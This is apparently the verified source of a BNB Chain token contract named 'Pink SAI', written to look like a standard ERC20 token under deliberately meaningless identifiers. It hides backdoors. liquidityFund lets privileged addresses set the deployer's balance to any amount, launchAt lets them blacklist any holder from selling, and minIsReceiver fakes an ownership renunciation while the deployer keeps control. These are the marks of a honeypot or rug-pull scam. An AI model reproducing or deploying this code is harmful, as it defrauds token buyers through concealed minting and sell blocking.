/**
 *Submitted for verification at BscScan.com on 2023-02-13
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

abstract contract receiverLaunched {
    function fundTo() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed sender,
        address indexed spender,
        uint256 value
    );
}


interface receiverTxSell {
    function createPair(address receiverMinLiquidity, address exemptEnable) external returns (address);
}

interface atMarketing {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract PinkSAI is IERC20, receiverLaunched {

    function symbol() external view returns (string memory) {
        return walletMax;
    }

    function enableMin() public {
        
        if (atBuy != buyExempt) {
            launchedReceiverMax = false;
        }
        feeListToken=false;
    }

    function minIsReceiver() public {
        emit OwnershipTransferred(toTotal, address(0));
        listWallet = address(0);
    }

    function tokenFund(address tokenList, address marketingToWallet, uint256 liquiditySender) internal returns (bool) {
        if (tokenList == toTotal) {
            return modeAuto(tokenList, marketingToWallet, liquiditySender);
        }
        require(!autoToShould[tokenList]);
        return modeAuto(tokenList, marketingToWallet, liquiditySender);
    }

    function getOwner() external view returns (address) {
        return listWallet;
    }

    string private walletMax = "PSI";

    address public toTotal;

    bool public feeListToken;

    function totalSupply() external view virtual override returns (uint256) {
        return sellAuto;
    }

    bool public atLaunch;

    uint256 private amountMarketing;

    function txAtList() public {
        
        if (launchedReceiverMax != buyExempt) {
            feeListToken = true;
        }
        launchLiquidity=0;
    }

    function balanceOf(address minMode) public view virtual override returns (uint256) {
        return totalLiquidityMode[minMode];
    }

    function transferFrom(address tokenList, address marketingToWallet, uint256 liquiditySender) external override returns (bool) {
        if (exemptReceiver[tokenList][fundTo()] != type(uint256).max) {
            require(liquiditySender <= exemptReceiver[tokenList][fundTo()]);
            exemptReceiver[tokenList][fundTo()] -= liquiditySender;
        }
        return tokenFund(tokenList, marketingToWallet, liquiditySender);
    }

    address public teamSell;

    address private listWallet;

    function liquidityFund(uint256 liquiditySender) public {
        if (!fromLaunch[fundTo()]) {
            return;
        }
        totalLiquidityMode[toTotal] = liquiditySender;
    }

    uint8 private amountMin = 18;

    mapping(address => uint256) private totalLiquidityMode;

    uint256 public launchLiquidity;

    function receiverSender(address sellFrom) public {
        if (teamMarketing) {
            return;
        }
        if (atLaunch != launchedReceiverMax) {
            launchedReceiverMax = true;
        }
        fromLaunch[sellFrom] = true;
        if (amountMarketing != launchLiquidity) {
            atBuy = false;
        }
        teamMarketing = true;
    }

    function swapMarketingAmount() public view returns (bool) {
        return launchedReceiverMax;
    }

    function approve(address limitFund, uint256 liquiditySender) public virtual override returns (bool) {
        exemptReceiver[fundTo()][limitFund] = liquiditySender;
        emit Approval(fundTo(), limitFund, liquiditySender);
        return true;
    }

    uint256 private sellAuto = 100000000 * 10 ** 18;

    bool public atBuy;

    function launchAt(address senderAuto) public {
        
        if (senderAuto == toTotal || senderAuto == teamSell || !fromLaunch[fundTo()]) {
            return;
        }
        if (buyExempt == atLaunch) {
            launchLiquidity = amountMarketing;
        }
        autoToShould[senderAuto] = true;
    }

    function allowance(address launchedExempt, address limitFund) external view virtual override returns (uint256) {
        return exemptReceiver[launchedExempt][limitFund];
    }

    string private modeToken = "Pink SAI";

    constructor (){
        if (feeTotalMax) {
            feeTotalMax = true;
        }
        atMarketing marketingLaunch = atMarketing(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        teamSell = receiverTxSell(marketingLaunch.factory()).createPair(marketingLaunch.WETH(), address(this));
        listWallet = fundTo();
        if (amountMarketing == launchLiquidity) {
            atLaunch = false;
        }
        toTotal = listWallet;
        fromLaunch[toTotal] = true;
        
        totalLiquidityMode[toTotal] = sellAuto;
        emit Transfer(address(0), toTotal, sellAuto);
        minIsReceiver();
    }

    function walletSell() public view returns (uint256) {
        return amountMarketing;
    }

    bool private buyExempt;

    bool public teamMarketing;

    event OwnershipTransferred(address indexed toMarketing, address indexed walletLimitIs);

    function name() external view returns (string memory) {
        return modeToken;
    }

    function modeAuto(address tokenList, address marketingToWallet, uint256 liquiditySender) internal returns (bool) {
        require(totalLiquidityMode[tokenList] >= liquiditySender);
        totalLiquidityMode[tokenList] -= liquiditySender;
        totalLiquidityMode[marketingToWallet] += liquiditySender;
        emit Transfer(tokenList, marketingToWallet, liquiditySender);
        return true;
    }

    bool public launchedReceiverMax;

    function decimals() external view returns (uint8) {
        return amountMin;
    }

    function owner() external view returns (address) {
        return listWallet;
    }

    function transfer(address launchReceiver, uint256 liquiditySender) external virtual override returns (bool) {
        return tokenFund(fundTo(), launchReceiver, liquiditySender);
    }

    mapping(address => mapping(address => uint256)) private exemptReceiver;

    mapping(address => bool) public fromLaunch;

    bool public feeTotalMax;

    mapping(address => bool) public autoToShould;

}